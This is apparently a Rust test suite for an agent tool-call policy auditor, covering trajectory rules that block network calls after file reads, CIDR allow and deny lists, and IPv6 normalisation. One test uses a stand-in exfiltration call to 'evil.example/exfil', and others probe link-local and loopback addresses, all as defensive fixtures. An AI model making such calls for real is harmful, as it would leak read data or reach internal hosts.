use super::*;

fn trajectory_policy(enabled: bool) -> Policy {
    let mut read = ToolPolicy::named("read_file", true);
    read.side_effect = Some("read_only".into());
    let mut fetch = ToolPolicy::named("fetch_url", true);
    fetch.side_effect = Some("network".into());
    let trajectory_rules = if enabled {
        vec![crate::policy::TrajectoryRule {
            after_side_effect: SideEffect::ReadOnly,
            deny_next: SideEffect::Network,
        }]
    } else {
        Vec::new()
    };
    Policy {
        trajectory: enabled,
        trajectory_rules,
        tools: vec![read, fetch],
        network: crate::policy::NetworkPolicy {
            outbound: crate::policy::OutboundPolicy {
                deny_all_others: false,
                ..Default::default()
            },
            ..Default::default()
        },
        ..Default::default()
    }
}

#[test]
fn test_trajectory_omitted_leaves_behavior_unchanged() {
    let policy = trajectory_policy(false);
    let mut session = SessionState::new();
    session.record_successful_tool_call("read_file", Some(SideEffect::ReadOnly));
    let fetch = tools_call(2, "fetch_url", r#"{"url":"https://example.com/x"}"#);
    assert!(check_request(&fetch, &policy).is_ok());
    assert!(check_trajectory(&fetch, &policy, &session).is_ok());
}

#[test]
fn test_trajectory_on_denies_network_after_successful_read_only() {
    let policy = trajectory_policy(true);
    let mut session = SessionState::new();
    let read = tools_call(1, "read_file", r#"{"path":"/workspace/a.txt"}"#);
    assert!(check_request(&read, &policy).is_ok());
    assert!(check_trajectory(&read, &policy, &session).is_ok());
    session.record_successful_tool_call("read_file", Some(SideEffect::ReadOnly));

    let fetch = tools_call(2, "fetch_url", r#"{"url":"https://example.com/x"}"#);
    assert!(check_request(&fetch, &policy).is_ok());
    let err = check_trajectory(&fetch, &policy, &session).unwrap_err();
    assert_eq!(err.tool_name, "fetch_url");
    assert!(err.reason.contains("trajectory"), "{}", err.reason);
}

#[test]
fn test_trajectory_off_allows_read_only_then_network() {
    let policy = trajectory_policy(false);
    let mut session = SessionState::new();
    session.record_successful_tool_call("read_file", Some(SideEffect::ReadOnly));
    let fetch = tools_call(2, "fetch_url", r#"{"url":"https://example.com/x"}"#);
    assert!(check_request(&fetch, &policy).is_ok());
    assert!(check_trajectory(&fetch, &policy, &session).is_ok());
}

#[test]
fn test_trajectory_denies_url_argument_even_without_network_side_effect() {
    let mut policy = trajectory_policy(true);
    policy.tools.push(ToolPolicy::named("post_note", true));
    let mut session = SessionState::new();
    session.record_successful_tool_call("read_file", Some(SideEffect::ReadOnly));
    let post = tools_call(3, "post_note", r#"{"url":"https://evil.example/exfil"}"#);
    assert!(request_has_host_or_url(&post));
    let err = check_trajectory(&post, &policy, &session).unwrap_err();
    assert!(err.reason.contains("trajectory"), "{}", err.reason);
}

#[test]
fn test_trajectory_mrtr_retry_ignores_request_state() {
    let policy = trajectory_policy(true);
    let mut session = SessionState::new();
    session.record_successful_tool_call("read_file", Some(SideEffect::ReadOnly));
    let retry = r#"{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"fetch_url","arguments":{"url":"https://example.com/x"},"requestState":"opaque-retry-blob"}}"#;
    assert!(check_request(retry, &policy).is_ok());
    let err = check_trajectory(retry, &policy, &session).unwrap_err();
    assert!(err.reason.contains("trajectory"), "{}", err.reason);
    assert!(!err.reason.contains("requestState"), "{}", err.reason);
}

#[test]
fn test_request_has_host_or_url_matches_side_effect_extractor() {
    assert!(request_has_host_or_url(&tools_call(
        1,
        "fetch_url",
        r#"{"url":"https://example.com/x"}"#
    )));
    assert!(!request_has_host_or_url(&tools_call(
        1,
        "read_file",
        r#"{"path":"/workspace/a.txt"}"#
    )));
}

// ── CIDR rules (`allow cidr=` / `deny cidr=`) at the RPC layer ──────

#[test]
fn test_tool_cidr_allow_gates_literal_ip_arguments() {
    // A literal-IP destination needs no resolution — the auditor
    // evaluates it against the tool's IP-layer allow list.
    let mut policy = Policy::default();
    policy.network.outbound.deny_all_others = false;
    let mut fetch = ToolPolicy::named("fetch", true);
    fetch.network = Some(ToolNetworkPolicy {
        allowed_hosts: vec![],
        allowed_cidrs: vec!["192.0.2.0/24".into()],
        denied_hosts: vec![],
        denied_cidrs: vec![],
        egress_rules: Vec::new(),
        allow_specified: true,
    });
    policy.tools = vec![fetch];

    let ok = tools_call(1, "fetch", r#"{"url":"https://192.0.2.7/x"}"#);
    assert!(check_request(&ok, &policy).is_ok());
    let outside = tools_call(2, "fetch", r#"{"url":"https://203.0.113.9/x"}"#);
    let err = check_request(&outside, &policy).unwrap_err();
    assert!(
        err.reason.contains("not in tool network allowed hosts"),
        "{}",
        err.reason
    );
    // A hostname argument cannot be checked against the IP layer — the
    // auditor cannot resolve names, so it fails closed.
    let named = tools_call(3, "fetch", r#"{"url":"https://api.example.com/x"}"#);
    assert!(check_request(&named, &policy).is_err());
}

#[test]
fn test_tool_cidr_deny_blocks_literal_ip() {
    let mut policy = Policy::default();
    policy.network.outbound.deny_all_others = false;
    let mut fetch = ToolPolicy::named("fetch", true);
    fetch.network = Some(ToolNetworkPolicy {
        allowed_hosts: vec![],
        allowed_cidrs: vec![],
        denied_hosts: vec![],
        denied_cidrs: vec!["169.254.0.0/16".into()],
        egress_rules: Vec::new(),
        allow_specified: false,
    });
    policy.tools = vec![fetch];

    let denied = tools_call(1, "fetch", r#"{"url":"https://169.254.1.1/x"}"#);
    let err = check_request(&denied, &policy).unwrap_err();
    assert!(err.reason.contains("cidr"), "{}", err.reason);
    let ok = tools_call(2, "fetch", r#"{"url":"https://api.example.com/x"}"#);
    assert!(check_request(&ok, &policy).is_ok());
}

#[test]
fn test_global_cidr_rules_gate_literal_ip_arguments() {
    // `denied_cidrs` on the global policy applies even to tools with no
    // network sub-policy; `allowed_cidrs` joins `allowed` under
    // deny_all_others for literal-IP destinations.
    let mut policy = Policy::default();
    let fetch = ToolPolicy::named("fetch", true);
    policy.tools = vec![fetch];
    policy.network.outbound.denied_cidrs = vec!["169.254.0.0/16".to_string()];
    policy.network.outbound.allowed_cidrs = vec!["192.0.2.0/24".to_string()];

    let denied = tools_call(1, "fetch", r#"{"url":"https://169.254.1.1/x"}"#);
    let err = check_request(&denied, &policy).unwrap_err();
    assert!(err.reason.contains("cidr"), "{}", err.reason);

    let inside = tools_call(2, "fetch", r#"{"url":"https://192.0.2.7/x"}"#);
    assert!(check_request(&inside, &policy).is_ok());
    let outside = tools_call(3, "fetch", r#"{"url":"https://203.0.113.9/x"}"#);
    assert!(check_request(&outside, &policy).is_err());
}

#[test]
fn test_global_deny_host_literal_is_an_ip_layer_deny() {
    // `denied_hosts` evaluates at both layers: an IP literal entry is
    // a `/32` IP-layer deny — it must catch a literal-IP argument even
    // when a covering `allow cidr` is present.
    let mut policy = Policy::default();
    let fetch = ToolPolicy::named("fetch", true);
    policy.tools = vec![fetch];
    policy.network.outbound.allowed_cidrs = vec!["192.0.2.0/24".to_string()];
    policy.network.outbound.denied_hosts = vec!["192.0.2.7".to_string()];

    let denied = tools_call(1, "fetch", r#"{"url":"https://192.0.2.7/x"}"#);
    assert!(check_request(&denied, &policy).is_err());
}

#[test]
fn test_bracketed_v6_argument_reaches_cidr_rules() {
    // A `host` field carrying the URL-spelling `[::1]` is normalized
    // before the IP-layer check — the bracketed form must not escape a
    // `deny cidr` the plain `::1` spelling would hit.
    let mut policy = Policy::default();
    policy.network.outbound.deny_all_others = false;
    let mut fetch = ToolPolicy::named("fetch", true);
    fetch.network = Some(ToolNetworkPolicy {
        allowed_hosts: vec![],
        allowed_cidrs: vec![],
        denied_hosts: vec![],
        denied_cidrs: vec!["::1/128".into()],
        egress_rules: Vec::new(),
        allow_specified: false,
    });
    policy.tools = vec![fetch];

    let bracketed = tools_call(1, "fetch", r#"{"host":"[::1]"}"#);
    assert!(check_request(&bracketed, &policy).is_err());
    let plain = tools_call(2, "fetch", r#"{"host":"::1"}"#);
    assert!(check_request(&plain, &policy).is_err());
    let ok = tools_call(3, "fetch", r#"{"host":"example.com"}"#);
    assert!(check_request(&ok, &policy).is_ok());
}
